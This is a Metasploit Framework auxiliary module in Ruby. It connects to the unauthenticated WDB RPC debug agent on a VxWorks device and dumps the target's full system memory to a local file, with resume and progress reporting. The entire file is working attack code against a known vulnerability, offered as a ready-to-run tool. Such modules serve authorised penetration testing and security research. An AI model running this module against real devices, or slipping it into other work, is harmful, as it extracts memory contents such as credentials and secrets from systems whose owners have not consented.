##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::WDBRPC_Client

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VxWorks WDB Agent Remote Memory Dump',
      'Description'    => %q{
        This module provides the ability to dump the system memory of a VxWorks target through WDBRPC
      },
      'Author'         => [ 'hdm'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '66842'],
          ['URL', 'http://blog.metasploit.com/2010/08/vxworks-vulnerabilities.html'],
          ['US-CERT-VU', '362332']
        ],
      'Actions'     =>
        [
          ['Download']
        ],
      'DefaultAction' => 'Download'
      ))

    register_options(
      [
        OptString.new('LPATH',
          [
            true,
            "The local filename to store the dumped memory",
            ::File.join(Msf::Config.log_directory, "vxworks_memory.dmp")
          ]
        ),
        OptInt.new('OFFSET', [ true, "The starting offset to read the memory dump (hex allowed)", 0 ])
      ], self.class)
  end

  def run
    offset = datastore['OFFSET'].to_i
    print_status("Attempting to dump system memory, starting at offset 0x%02x" % offset)

    wdbrpc_client_connect

    if not @wdbrpc_info[:rt_vers]
      print_error("No response to connection request")
      return
    end

    membase = @wdbrpc_info[:rt_membase]
    memsize = @wdbrpc_info[:rt_memsize]
    mtu     = @wdbrpc_info[:agent_mtu]

    print_status("Dumping #{"0x%.8x" % memsize} bytes from base address #{"0x%.8x" % membase} at offset #{"0x%.8x" % offset}...")

    lfd = nil
    if offset != 0
      begin
        # Turns out ruby's implementation of seek with "ab" mode is all kind of busted.
        lfd = ::File.open(datastore['LPATH'], "r+b")
        lfd.seek(offset)
      rescue Errno::ENOENT
        print_error("Unable to open existing dump!  Writing a new file instead of resuming...")
        lfd = ::File.open(datastore['LPATH'], "wb")
      end
    else
      lfd = ::File.open(datastore['LPATH'], "wb")
    end

    mtu -= 80
    idx  = offset
    lpt  = 0.00
    sts = Time.now.to_f


    while (idx < memsize)
      buff = wdbrpc_client_memread(membase + idx, mtu)
      if not buff
        print_error("Failed to download data at offset #{"0x%.8x" % idx}")
        return
      end

      idx += buff.length
      lfd.write(buff)

      pct = ((idx / memsize.to_f) * 10000).to_i
      pct = pct / 100.0

      if pct != lpt
        eta = Time.at(Time.now.to_f + (((Time.now.to_f - sts) / pct) * (100.0 - pct)))
        print_status("[ #{sprintf("%.2d", pct)} % ] Downloaded #{"0x%.8x" % idx} of #{"0x%.8x" % memsize} bytes (complete at #{eta.to_s})")
        lpt = pct
      end
    end

    lfd.close

    print_status("Dumped #{"0x%.8x" % idx} bytes.")
    wdbrpc_client_disconnect
  end

end
